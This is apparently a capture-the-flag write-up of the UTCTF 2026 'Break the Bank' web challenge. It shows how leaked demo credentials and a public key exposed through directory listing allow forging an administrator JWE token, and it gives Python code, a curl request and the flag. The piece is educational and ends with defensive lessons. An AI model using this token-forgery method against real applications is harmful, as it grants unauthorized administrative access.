---
title: "UTCTF 2026 - Break the Bank Writeup | JWE Authentication Bypass"
date: 2026-03-15
description: "Exploiting a JWE implementation flaw caused by an exposed RSA public key to forge administrator tokens."
tags:
  - CTF
  - Web Security
  - JWE
  - Cryptography
category: Writeups
author: 0xuserm9
draft: false
---

![UTCTF 2026 - Break the Bank](https://0xuserm9.vercel.app/images/bankk/UTCTF.png)

## Challenge Information

| Field | Value |
|-------|-------|
| **CTF** | UTCTF 2026 |
| **Challenge** | Break the Bank |
| **Category** | Web Exploitation |
| **Points** | 278 |
| **Author** | Emmett (@emdawg25) |
| **Flag** | `utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}` |

---

## TL;DR

A publicly accessible RSA key was leaked through directory listing.

The application used **JWE** instead of signed **JWTs**, assuming that successful decryption implied authenticity.

By encrypting our own payload:

```json
{"sub":"admin"}
```

with the exposed public key, we generated a valid administrator token and gained access to the admin panel.

---

## Initial Enumeration

The application presented a nostalgic online banking interface with only a few available pages.

![Application Homepage](https://0xuserm9.vercel.app/images/bankk/1.PNG)

The most interesting endpoint was the login page.

While browsing the source code, one link immediately stood out:

```html
<a href="/resources/FNSB_InternetBanking_Guide.pdf">
    Access our Internet Banking guide here.
</a>
```

Downloading the PDF revealed something developers should never leave inside production documentation:

> **Demo Account**  
> Username: `testuser`  
> Password: `testpass123`

These credentials allowed us to inspect how authentication worked internally.

---

## Authentication Analysis

Authenticating with the demo account generated the following request:

```http
POST /login HTTP/1.1
Content-Type: application/json

{"username":"testuser","password":"testpass123"}
```

The server replied with a session cookie:

```http
HTTP/1.1 200 OK
Set-Cookie: fnsb_token=eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0.U5JzT4X...

{"token":"eyJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiUlNBLU9BRVAtMjU2In0.U5JzT4X...","redirect":"/profile"}
```

The token format immediately identified it as a **JWE**, consisting of five Base64URL-encoded components:

```
BASE64URL(header).
BASE64URL(encrypted_key).
BASE64URL(iv).
BASE64URL(ciphertext).
BASE64URL(authentication_tag)
```

Decoding the protected header produced:

```json
{
  "cty": "JWT",
  "alg": "RSA-OAEP-256",
  "enc": "A256GCM"
}
```

This is an important distinction.

Unlike a traditional JWT that relies on a digital signature for authenticity, this application only encrypted its payload.

- `RSA-OAEP-256` encrypts the Content Encryption Key using RSA.
- `A256GCM` encrypts the payload itself.

The critical implication is that **anyone possessing the public key can create encrypted messages** that only the server can decrypt.

Encryption alone does **not** prove who created the token.

---

## Looking at Authorization

Accessing the administrator endpoint with a normal user session returned:

```json
{"error":"Forbidden: admin subject required"}
```

This revealed exactly how authorization was implemented.

The server simply checked the value of the `sub` claim.

If we could generate a token containing

```json
{"sub":"admin"}
```

the authorization check would succeed.

---

## The Critical Discovery

Directory enumeration eventually uncovered an indexed `/resources/` directory.

```
Index of /resources/

FNSB_InternetBanking_Guide.pdf
key.pem
memo.txt
```

Finding `key.pem` was the turning point.

Downloading it revealed the server's RSA public key:

```text
-----BEGIN PUBLIC KEY-----

MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsio2dcXheqKLrteRx4V1
7FchW6AE2zszlMyiN8S7D16ww1a9AFC8EQhEHNW1PLXncXiimNeb6/oZP2+V18gE
ZoyKIET2oHC4MmthSOFrW0nFgfgRJdH7VyEVHupFL6tFAJvHFWVplTgCdqtegihG
cG7XKUGah4Q8FytlIhk/A983LtbblhAnfKTeBwxT2wVZE9+5pWhPmdGLoX3Hf0Uy
pHJTkL6D7C4X4KGJiNrSJ6mJw4sDpXlZEvagB0uFaO4b22WX6HSf2ZOBW5VHEWS5
TiKvliyTQL3FJWXefqxHgQL8diDWhWwYXI7Q0b+otJ5/G/jMGL2S+N10oJTitTuK
OQIDAQAB

-----END PUBLIC KEY-----
```

Most developers consider leaking a public key harmless.

Normally, that's true.

The problem was that the application **trusted any correctly decrypted JWE**, confusing confidentiality with authenticity.

---

## Forging an Administrator Token

Using the leaked public key, we can simply encrypt our own payload.

```python
from joserfc import jwe
from joserfc.jwk import RSAKey
from joserfc.jwe import JWERegistry
import json

registry = JWERegistry(
    algorithms=["RSA-OAEP-256", "A256GCM"]
)

protected = {
    "cty": "JWT",
    "alg": "RSA-OAEP-256",
    "enc": "A256GCM"
}

payload = {
    "sub": "admin"
}

plaintext = json.dumps(
    payload,
    separators=(",", ":")
).encode()

# token = jwe.encrypt_compact(
#     protected,
#     plaintext,
#     key,
#     registry=registry
# )

# print(token)
```

No brute force.

No cryptographic attack.

Just using the application exactly as designed.

---

## Retrieving the Flag

Replacing the session cookie with our forged JWE immediately granted administrator access.

```bash
curl -s \
-H "Cookie: fnsb_token=$TOKEN" \
http://challenge.utctf.live:5926/admin
```

The response:

```html
<!DOCTYPE html>

<html>

<head>
<title>FNSB SysAdmin Console</title>
</head>

<body>

<h1>Welcome, Administrator</h1>

<div class="flag">
utflag{s0m3_c00k1es_@re_t@st13r_th@n_0th3rs}
</div>

</body>

</html>
```

Mission accomplished.

---

# Takeaways

This challenge demonstrates a surprisingly common misconception surrounding encrypted tokens.

A **JWE only provides confidentiality**.

It does **not** provide authenticity.

If an application accepts *any* decryptable token as trustworthy, anyone with access to the public key can manufacture arbitrary tokens.

Proper authentication should rely on **signed JWTs (JWS)** or another mechanism that cryptographically verifies the token's origin—not merely its ability to decrypt.

A single exposed public key transformed what should have been a secure authentication mechanism into a complete privilege escalation.

---

Happy Hacking 🏴‍☠️